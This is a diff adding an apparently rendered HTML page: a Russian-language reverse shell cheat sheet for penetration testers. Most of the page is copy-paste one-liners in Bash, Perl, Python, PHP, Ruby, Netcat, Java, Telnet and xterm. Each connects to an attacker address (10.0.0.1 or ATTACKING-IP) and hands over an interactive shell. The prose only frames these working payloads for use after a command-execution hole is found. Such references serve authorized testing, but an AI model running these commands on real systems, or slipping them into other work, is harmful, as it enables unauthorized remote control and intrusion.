@@ -1,0 +1,117 @@
+I"� <h1 class="no_toc" id="оглавление">Оглавление</h1>
+
+<ul id="markdown-toc">
+  <li><a href="#общие-слова" id="markdown-toc-общие-слова">Общие слова</a></li>
+  <li><a href="#bash" id="markdown-toc-bash">Bash</a></li>
+  <li><a href="#perl" id="markdown-toc-perl">PERL</a></li>
+  <li><a href="#python" id="markdown-toc-python">Python</a></li>
+  <li><a href="#php" id="markdown-toc-php">PHP</a></li>
+  <li><a href="#ruby" id="markdown-toc-ruby">Ruby</a></li>
+  <li><a href="#netcat" id="markdown-toc-netcat">Netcat</a></li>
+  <li><a href="#java" id="markdown-toc-java">Java</a></li>
+  <li><a href="#telnet" id="markdown-toc-telnet">Telnet</a></li>
+  <li><a href="#xterm" id="markdown-toc-xterm">xterm</a></li>
+</ul>
+
+<h1 id="общие-слова">Общие слова</h1>
+
+<p>Если тебе повезло обнаружить уязвимость выполнения команд во время теста на проникновение, довольно скоро тебе захочется интерактивный шелл.</p>
+
+<p>Если не получается добавить новый аккаунт / SSH ключ / .rhosts файл, твой следующий шаг, вероятно, будет либо делать обратный шелл, либо привязывать оболочку к порту TCP. Эта страница поможет с первым.</p>
+
+<p>Варианты делать обратный шелл ограничены языками сценариев, установленными в целевой системе, хотя также можете загрузить бинарник, если достаточно хорошо подготовиться.</p>
+
+<p>Показанные примеры предназначены для Unix-подобных систем. Некоторые из приведенных ниже примеров также должны работать в Windows, если вы используете замену “/bin/sh -i” с “cmd.exe”.</p>
+
+<p>Почти каждый из методов приведенных ниже предназначен для использования в качестве одной строки которую можно копировать/вставлять. Это довольно короткие строки, но не очень читаемые.</p>
+
+<h1 id="bash">Bash</h1>
+
+<p>Некоторые версии bash могут помочь с реверс шеллом (тестированно на Ubuntu 10.10):</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exec /bin/bash 0&amp;0 2&gt;&amp;0
+</code></pre></div></div>
+<h1 id="perl">PERL</h1>
+
+<p>Вот короткая, не зависищая от фич версия  perl реверс шелла:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i))))
+{open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+</code></pre></div></div>
+
+<p>И для Windows</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))
+{open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+</code></pre></div></div>
+
+<h1 id="python">Python</h1>
+
+<p>Тестированно на Linux/Python 2.7:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.0.1",1234));
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</code></pre></div></div>
+
+<h1 id="php">PHP</h1>
+
+<p>Этот код предполагает TCP соединение с дескриптором 3. Это работало на тест системе. Если не работает, попробуй 4, 5, 6…</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+</code></pre></div></div>
+
+<p>Если хочешь .php файл для загрузки, посмотри более навороченные php.</p>
+
+<h1 id="ruby">Ruby</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
+</code></pre></div></div>
+
+<h1 id="netcat">Netcat</h1>
+
+<p>Netcat редко присутствует в продакшен системах, и даже если там несколько версий netcat, некоторые из них не поддерживают опцию -e.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -e /bin/sh 10.0.0.1 1234
+</code></pre></div></div>
+
+<p>Если у вас установлена неправильная версия netcat, ты всё равно можешь получить реверс шелл вот так:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
+</code></pre></div></div>
+
+<h1 id="java">Java</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
+p.waitFor()
+</code></pre></div></div>
+
+<h1 id="telnet">Telnet</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
+</code></pre></div></div>
+
+<p>Не забудь также слушать 443 на атакующей машине.</p>
+
+<h1 id="xterm">xterm</h1>
+
+<p>Одной из самых простых форм обратной оболочки является xterm. Следующая команда должна быть запущена на сервере. Он попытается подключиться к тебе (10.0.0.1) через TCP-порт 6001.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xterm -display 10.0.0.1:1
+</code></pre></div></div>
+
+<p>Чтобы перехватить входящий xterm, запусти X-сервер (:1 - который прослушивает TCP-порт 6001). Один из способов сделать это с помощью Xnest (для запуска в твоей системе):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Xnest :1
+</code></pre></div></div>
+
+<p>Тебе нужно авторизовать цель для подключения (команда также запускается на твоем хосте):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xhost +targetip
+</code></pre></div></div>
+:ET
